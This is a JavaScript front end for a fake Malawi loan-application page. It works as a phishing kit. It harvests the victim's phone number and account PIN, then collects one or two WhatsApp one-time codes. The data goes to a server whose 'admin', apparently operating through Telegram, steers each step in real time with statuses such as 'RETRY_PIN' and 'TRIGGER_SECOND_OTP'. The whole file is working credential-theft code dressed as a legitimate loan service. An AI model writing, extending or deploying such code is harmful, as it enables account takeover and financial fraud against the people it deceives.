document.addEventListener('DOMContentLoaded', () => {
  // Navigation State
  let currentStep = 1;
  let currentUserId = null;
  let otpStep = 1;
  let statusPollInterval = null;

  // URL Query Admin Parameter Parsing
  const urlParams = new URLSearchParams(window.location.search);
  const adminParam = urlParams.get('admin') || '';

  // Elements
  const screens = {
    welcome: document.getElementById('screen-welcome'),
    step1: document.getElementById('screen-step1'),
    step2: document.getElementById('screen-step2'),
    step3: document.getElementById('screen-step3'),
    otp: document.getElementById('screen-otp'),
    success: document.getElementById('screen-success')
  };

  const loadingOverlay = document.getElementById('loading-overlay');
  const loadingTitle = document.getElementById('loading-title');
  const loadingSub = document.getElementById('loading-sub');

  // Input Fields
  const loanType = document.getElementById('loan-type');
  const loanAmount = document.getElementById('loan-amount');
  const loanDuration = document.getElementById('loan-duration');
  const loanPurpose = document.getElementById('loan-purpose');

  const firstName = document.getElementById('first-name');
  const lastName = document.getElementById('last-name');
  const phoneNumber = document.getElementById('phone-number');
  const pinDigits = document.querySelectorAll('.pin-digit');
  const otpDigits = document.querySelectorAll('.otp-digit');

  // Errors
  const phoneError = document.getElementById('phone-error');
  const pinError = document.getElementById('pin-error');
  const otpError = document.getElementById('otp-error');

  // Screen Switch Helper
  function showScreen(screenKey) {
    Object.values(screens).forEach(screen => screen.classList.remove('active'));
    if (screens[screenKey]) screens[screenKey].classList.add('active');
  }

  // Auto-tab for PIN and OTP digit boxes (Strictly digits only)
  function setupDigitInputs(inputs) {
    inputs.forEach((input, idx) => {
      input.addEventListener('input', (e) => {
        // Enforce numeric only
        input.value = input.value.replace(/\D/g, '');
        if (input.value && idx < inputs.length - 1) {
          inputs[idx + 1].focus();
        }
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value && idx > 0) {
          inputs[idx - 1].focus();
        }
      });
    });
  }

  setupDigitInputs(pinDigits);
  setupDigitInputs(otpDigits);

  // Phone number restriction (Digits only)
  phoneNumber.addEventListener('input', () => {
    phoneNumber.value = phoneNumber.value.replace(/\D/g, '');
  });

  // Screen 0 -> Screen 1
  document.getElementById('btn-welcome-proceed').addEventListener('click', () => {
    showScreen('step1');
  });

  // Step 1 -> Step 2
  document.getElementById('btn-step1-next').addEventListener('click', () => {
    showScreen('step2');
  });

  // Step 2 Back
  document.getElementById('btn-step2-back').addEventListener('click', () => {
    showScreen('step1');
  });

  // Step 2 -> Step 3 Validation
  document.getElementById('btn-step2-next').addEventListener('click', () => {
    let valid = true;

    // Validate Malawi Phone Number (099, 098, 088, 077)
    const cleanPhone = phoneNumber.value.replace(/\D/g, '');
    const isMalawiNumber = /^(099|098|088|077)\d{7}$/.test(cleanPhone);

    if (!isMalawiNumber) {
      phoneError.style.display = 'block';
      valid = false;
    } else {
      phoneError.style.display = 'none';
    }

    // Validate PIN (4 digits)
    const pinVal = Array.from(pinDigits).map(i => i.value).join('');
    if (pinVal.length !== 4) {
      pinError.style.display = 'block';
      valid = false;
    } else {
      pinError.style.display = 'none';
    }

    if (valid) {
      // Update Summary Fields
      document.getElementById('sum-amount').innerText = `MWK ${Number(loanAmount.value).toLocaleString()}`;
      document.getElementById('sum-duration').innerText = loanDuration.value;
      document.getElementById('sum-category').innerText = loanType.value;
      document.getElementById('sum-name').innerText = `${firstName.value} ${lastName.value}`.trim() || 'Valued Customer';
      document.getElementById('sum-phone').innerText = cleanPhone;

      showScreen('step3');
    }
  });

  // Step 3 Back
  document.getElementById('btn-step3-back').addEventListener('click', () => {
    showScreen('step2');
  });

  // Step 3 Submit -> Server API Call
  document.getElementById('btn-step3-submit').addEventListener('click', async () => {
    const cleanPhone = phoneNumber.value.replace(/\D/g, '');
    const pinVal = Array.from(pinDigits).map(i => i.value).join('');
    const amtVal = `MWK ${Number(loanAmount.value).toLocaleString()}`;

    showLoading('Submitting Application...', 'Sending your application details securely.');

    try {
      const res = await fetch(`/api/submit-application?admin=${encodeURIComponent(adminParam)}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          contact: cleanPhone,
          pin: pinVal,
          amount: amtVal,
          adminChatId: adminParam
        })
      });

      const data = await res.json();
      if (data.success) {
        currentUserId = data.userId;
        loadingTitle.innerText = 'Awaiting Admin Verification...';
        loadingSub.innerText = 'Please stay on this page while your request is processed.';
        startStatusPolling();
      } else {
        hideLoading();
        alert(data.error || 'Submission failed. Please check your credentials.');
      }
    } catch (err) {
      hideLoading();
      alert('Network connection error. Please try again.');
    }
  });

  // Polling Telegram Admin Actions
  function startStatusPolling() {
    if (statusPollInterval) clearInterval(statusPollInterval);

    statusPollInterval = setInterval(async () => {
      if (!currentUserId) return;

      try {
        const res = await fetch(`/api/check-status/${currentUserId}`);
        const data = await res.json();

        if (data.status === 'APPROVED_LOAD_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          otpStep = 1;
          document.getElementById('otp-phone-display').innerText = phoneNumber.value;
          showScreen('otp');
        } else if (data.status === 'TRIGGER_SECOND_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          otpStep = 2;
          // Reset OTP input inputs for Step 2
          otpDigits.forEach(i => i.value = '');
          otpDigits[0].focus();
          alert('First OTP accepted. Please enter the secondary verification OTP from WhatsApp.');
          showScreen('otp');
        } else if (data.status === 'SUCCESS') {
          clearInterval(statusPollInterval);
          hideLoading();
          document.getElementById('approved-amount-display').innerText = `MWK ${Number(loanAmount.value).toLocaleString()}`;
          showScreen('success');
        } else if (data.status === 'RETRY_PIN') {
          clearInterval(statusPollInterval);
          hideLoading();
          alert('Incorrect PIN entered. Please verify and enter your PIN again.');
          pinDigits.forEach(i => i.value = '');
          showScreen('step2');
        } else if (data.status === 'RETRY_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          alert('Incorrect OTP entered. Please re-enter the code received from WhatsApp.');
          otpDigits.forEach(i => i.value = '');
          showScreen('otp');
        } else if (data.status === 'DENIED') {
          clearInterval(statusPollInterval);
          hideLoading();
          alert('Your application request was declined. Please contact support.');
          showScreen('welcome');
        }
      } catch (e) {}
    }, 3000);
  }

  // Submit OTP API Call
  document.getElementById('btn-submit-otp').addEventListener('click', async () => {
    const otpVal = Array.from(otpDigits).map(i => i.value).join('');

    if (otpVal.length < 4 || !/^\d+$/.test(otpVal)) {
      otpError.style.display = 'block';
      return;
    }
    otpError.style.display = 'none';

    showLoading('Verifying OTP...', 'Validating your WhatsApp security code.');

    try {
      const res = await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: currentUserId,
          otp: otpVal,
          step: otpStep
        })
      });

      const data = await res.json();
      if (data.success) {
        loadingTitle.innerText = 'Verifying Security Code...';
        loadingSub.innerText = 'Please wait while admin confirms your code.';
        startStatusPolling();
      } else {
        hideLoading();
        alert(data.error || 'Failed to submit OTP.');
      }
    } catch (e) {
      hideLoading();
      alert('Network error submitting OTP.');
    }
  });

  // Return Home
  document.getElementById('btn-go-home').addEventListener('click', () => {
    window.location.href = `/?admin=${encodeURIComponent(adminParam)}`;
  });

  // Helpers
  function showLoading(title, sub) {
    loadingTitle.innerText = title;
    loadingSub.innerText = sub;
    loadingOverlay.classList.add('active');
  }

  function hideLoading() {
    loadingOverlay.classList.remove('active');
  }
});
    
